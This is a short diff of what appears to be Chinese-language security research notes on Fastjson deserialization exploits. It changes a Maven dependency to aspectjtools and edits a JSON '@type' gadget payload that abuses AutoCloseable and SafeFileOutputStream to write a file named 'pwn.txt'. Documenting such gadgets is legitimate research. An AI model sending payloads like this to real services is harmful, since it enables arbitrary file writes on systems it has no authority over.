@@ -725,9 +725,9 @@ https://b1ue.cn/archives/348.html   **使用Throwable子类造成信息泄露**
     <version>5.0.73</version>
 </dependency>
 <dependency>
-   <groupId>com.sleepycat</groupId>
-   <artifactId>je</artifactId>
-   <version>5.0.73</version>
+    <groupId>org.aspectj</groupId>
+    <artifactId>aspectjtools</artifactId>
+    <version>1.9.5</version>
 </dependency>
 ```
 
@@ -737,7 +737,7 @@ https://b1ue.cn/archives/348.html   **使用Throwable子类造成信息泄露**
         "@type": "java.lang.AutoCloseable",
         "@type": "org.eclipse.core.internal.localstore.SafeFileOutputStream",
         "targetPath": "f:/test/pwn.txt",
-        "tempPath": "f:/test/test.txt"
+        "tempPath": ""
     },
     "writer": {
         "@type": "java.lang.AutoCloseable",
